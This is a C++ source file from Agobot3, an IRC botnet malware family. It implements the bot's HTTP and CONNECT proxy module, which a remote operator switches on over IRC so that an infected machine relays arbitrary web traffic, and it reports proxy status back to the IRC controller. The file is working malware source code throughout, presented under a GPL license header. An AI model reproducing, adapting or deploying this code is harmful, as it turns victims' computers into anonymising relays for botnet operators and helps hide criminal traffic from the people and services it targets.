/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "redir_http.h"
#include "mainctrl.h"
#include "utility.h"

/*
in internet explorer under
Tools|Internet Options..|Advanced
disable
Use HTTP 1.1 through proxy connections

in mozilla under
Edit|Preferences|Advanced|HTTP Networking|Proxy Connection Options
disable
Enable Keep-Alive
*/

CRedirectHTTP_Thread::CRedirectHTTP_Thread() { m_sRedirectName.Assign("redirhttp"); }

void CRedirectHTTP_Thread::StartRedirect()
{	m_sServerSocket=INVALID_SOCKET; m_iConnections=0;
	int iErr=1; bool bFinished=false; while(!bFinished) {
		url uURL; char szBuffer[MAX_PATH]; bool bGet=false;

		// Receive the proxy request
		if(!recv_line_irc(m_sClientSocket, szBuffer, MAX_PATH, NULL)) { bFinished=true; break; }
		CString sBuffer(szBuffer);
		// Fail if there is no url
		// if(!sBuffer.Token(1, " ").Compare("")) { bFinished=true; break; }

		if(!sBuffer.Compare("")) { bFinished=true; break; }

		if(!sBuffer.Token(0, " ").CompareNoCase("GET")) { // GET method
			bGet=true;
			// Parse the url
			if(!ParseURL(sBuffer.Token(1, " ").CStr(), &uURL)) { bFinished=true; break; }
			// Fail if the protocol isnt http
			if(uURL.sProto.Compare("http")) { bFinished=true; break; }
		} else if(!sBuffer.Token(0, " ").CompareNoCase("CONNECT")) { // CONNECT method
			bGet=false;
			// Parse the host
			uURL.sProto.Assign("connect");
			uURL.sReq.Assign("");
			uURL.sHost.Assign(sBuffer.Token(1, " ").Token(0, ":"));
			if(!sBuffer.Token(1, " ").Token(1, ":").CStr()) { bFinished=true; break; }
			uURL.iPort=atoi(sBuffer.Token(1, " ").Token(1, ":").CStr());
			if(!uURL.iPort) uURL.iPort=80; }

		// Get the rest of the request
		CString sMethod(sBuffer.Token(0, " ")); if(!sMethod.Compare("")) { bFinished=true; break; }
		CString sHTTPVer(sBuffer.Token(2, " ")); if(!sHTTPVer.Compare("")) { bFinished=true; break; }
		CString sOldHost(uURL.sHost);

#ifdef DBGCONSOLE
		if(bGet)
			g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s %s %s...\n", m_pRedirHTTP, sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr());
		else
			g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s %s:%d %s...\n", m_pRedirHTTP, sMethod.CStr(), uURL.sHost.CStr(), uURL.iPort, sHTTPVer.CStr());
#endif

		char szBuf[4096]; strcpy(szBuf, "bla");
		if(bGet) {
			if(xRead(m_sClientSocket, szBuf, sizeof(szBuf))<1)
			{	xClose(m_sClientSocket); return; }
		} else {
			while(strcmp(szBuf, "")) // Loop while headers arent finished
				if(!recv_line_irc(m_sClientSocket, szBuf, 4096, NULL)) { bFinished=true; break; }
			if(bFinished) break; }

		CString sReqBuf;
		if(bGet)
			sReqBuf.Format("%s %s %s\r\n%s", sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr(), szBuf);
		else
			sReqBuf.Format("HTTP/1.0 200 Connection established\r\n\r\n");

		m_sServerSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(m_sServerSocket==SOCKET_ERROR || m_sServerSocket==INVALID_SOCKET)
		{	xClose(m_sClientSocket); return; }

		// Fill in sockaddr and resolve the host
		sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family=AF_INET; ssin.sin_port=htons(uURL.iPort);
		ssin.sin_addr.s_addr=ResolveAddress(uURL.sHost.CStr());
		if(ssin.sin_addr.s_addr==INADDR_NONE) // The host couldn't be resolved, exit
		{
#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s could not be resolved (%s)...\n", m_pRedirHTTP, uURL.sHost.CStr(), uURL.sReq.CStr());
#endif
			xClose(m_sClientSocket); xClose(m_sServerSocket); return; }

		// Connect to the server
		iErr=connect(m_sServerSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
		if(iErr==SOCKET_ERROR) // Connect failed, exit
		{	
#ifdef DBGCONSOLE
			g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): Cannot connect to %s:%d (%s)...\n", m_pRedirHTTP, uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr());
#endif
			xClose(m_sClientSocket); xClose(m_sServerSocket); return; }

		if(bGet) {
			iErr=xWrite(m_sServerSocket, sReqBuf.CStr(), sReqBuf.GetLength());
			if(!iErr || iErr==SOCKET_ERROR) { xClose(m_sClientSocket); xClose(m_sServerSocket); return; }
		} else {
			iErr=xWrite(m_sClientSocket, sReqBuf.CStr(), sReqBuf.GetLength());
			if(!iErr || iErr==SOCKET_ERROR) { xClose(m_sClientSocket); xClose(m_sServerSocket); return; }
		}

		int iLen; fd_set fd;
		SET_SOCK_BLOCK(m_sClientSocket, 0); SET_SOCK_BLOCK(m_sServerSocket, 0);

		if(bGet) {
			while(true)
			{	memset(szBuffer, 0, sizeof(szBuffer));
				if(!recv_line_irc(m_sClientSocket, szBuffer, sizeof(szBuffer), NULL)) { Sleep(10); break; }
				if(strcmp(szBuffer, "")) {
					sBuffer.Assign(szBuffer);
					if(!sBuffer.Token(0, " ").Compare("GET"))
					{	// Fail if there is no url
						if(!sBuffer.Token(1, " ").Compare("")) { bFinished=true; break; }
						// Parse the url
						if(!ParseURL(sBuffer.Token(1, " ").CStr(), &uURL)) break;
						// Fail if the protocol isnt http
						if(uURL.sProto.Compare("http")) { bFinished=true; break; }
						// Get the rest of the request
						CString sMethod(sBuffer.Token(0, " ")); if(!sMethod.Compare("")) { bFinished=true; break; }
						CString sHTTPVer(sBuffer.Token(2, " ")); if(!sHTTPVer.Compare("")) { bFinished=true; break; }
						sBuffer.Format("%s %s %s\r\n", sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr());
						if(uURL.sHost.Compare(sOldHost))
						{	xClose(m_sServerSocket);
							m_sServerSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
							if(m_sServerSocket==SOCKET_ERROR || m_sServerSocket==INVALID_SOCKET)
							{	xClose(m_sClientSocket); return; }
							
							// Fill in sockaddr and resolve the host
							sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin));
							ssin.sin_family=AF_INET; ssin.sin_port=htons(uURL.iPort);
							ssin.sin_addr.s_addr=ResolveAddress(uURL.sHost.CStr());
							if(ssin.sin_addr.s_addr==INADDR_NONE) // The host couldn't be resolved, exit
							{
#ifdef DBGCONSOLE
								g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s could not be resolved (%s)...\n", m_pRedirHTTP, uURL.sHost.CStr(), uURL.sReq.CStr());
#endif
								xClose(m_sClientSocket); xClose(m_sServerSocket); return; }

							// Connect to the server
							iErr=connect(m_sServerSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
							if(iErr==SOCKET_ERROR) // Connect failed, exit
							{	
#ifdef DBGCONSOLE
								g_cMainCtrl.m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): Cannot connect to %s:%d (%s)...\n", m_pRedirHTTP, uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr());
#endif
								xClose(m_sClientSocket); xClose(m_sServerSocket); return; }
							
							sOldHost.Assign(uURL.sHost); }
					}
					else
					{	sBuffer.Append("\r\n"); }
				if(xWrite(m_sServerSocket, sBuffer.CStr(), sBuffer.GetLength())<1) break; }

				iLen=xRead(m_sServerSocket, szBuf, sizeof(szBuf));
				if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); break; }
				xWrite(m_sClientSocket, szBuf, iLen);
			}
		} else {
			while(true) {
				iLen=xRead(m_sClientSocket, szBuf, sizeof(szBuf));
				if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); break; }
				xWrite(m_sServerSocket, szBuf, iLen);

				iLen=xRead(m_sServerSocket, szBuf, sizeof(szBuf));
				if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); break; }
				xWrite(m_sClientSocket, szBuf, iLen);
			}
		}

		xClose(m_sClientSocket); xClose(m_sServerSocket);
		bFinished=true;
	}
}

/*
	SET_SOCK_BLOCK(sSock1, 0); SET_SOCK_BLOCK(sSock2, 0);
	int iLen; char buf[1024]; fd_set fd; while(true) {
		iLen=xRead(sSock1, buf, sizeof(buf));
		if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) break;
		xWrite(sSock2, buf, iLen);

		iLen=xRead(sSock2, buf, sizeof(buf));
		if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) break;
		xWrite(sSock1, buf, iLen);
	}
	xClose(sSock1); xClose(sSock2);
*/

CRedirectHTTP::CRedirectHTTP() { m_sRedirectName.Assign("redirhttp"); }

void CRedirectHTTP::HTTPProxy()
{	m_sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sListenSocket==SOCKET_ERROR) return;

	sockaddr_in ssin, cssin; memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family=AF_INET; ssin.sin_port=htons(m_iLocalPort);
	socklen_t clen=sizeof(cssin);

	if(bind(m_sListenSocket, (sockaddr*)&ssin, sizeof(ssin))!=0)
	{	xClose(m_sListenSocket); return; }

	while(m_pRedirect->m_bRedirecting)
	{	if(listen(m_sListenSocket, 10)==SOCKET_ERROR) { Sleep(250); continue; }
		int sClientSocket=accept(m_sListenSocket, (sockaddr*)&cssin, &clen);
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(1, "CRedirectHTTP(0x%8.8Xh): Accepted connection from %s...\n", this, inet_ntoa(to_in_addr(cssin.sin_addr.s_addr)));
#endif
		if(sClientSocket!=SOCKET_ERROR && sClientSocket!=0)
		{	CRedirectHTTP_Thread *pTemp=new CRedirectHTTP_Thread;
			pTemp->m_pRedirect=m_pRedirect; pTemp->m_pRedirHTTP=this;
			pTemp->m_iLocalPort=m_iLocalPort; pTemp->m_sClientSocket=sClientSocket;
			pTemp->m_sReplyTo.Assign(m_sReplyTo); pTemp->m_bSilent=m_bSilent; pTemp->m_bNotice=m_bNotice;
			pTemp->Start(); }
		else
		{	break; } }

	if(m_sListenSocket!=INVALID_SOCKET) xClose(m_sListenSocket); }

void CRedirectHTTP::StartRedirect()
{	if(m_bUseSSL)
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: starting proxy on port %d, using ssl.", \
									  m_sRedirectName.CStr(), m_iLocalPort);
	else
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: starting proxy on port %d.", \
									  m_sRedirectName.CStr(), m_iLocalPort);

	HTTPProxy();	
	
	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: finished proxy on port %d.", \
								  m_sRedirectName.CStr(), m_iLocalPort); }
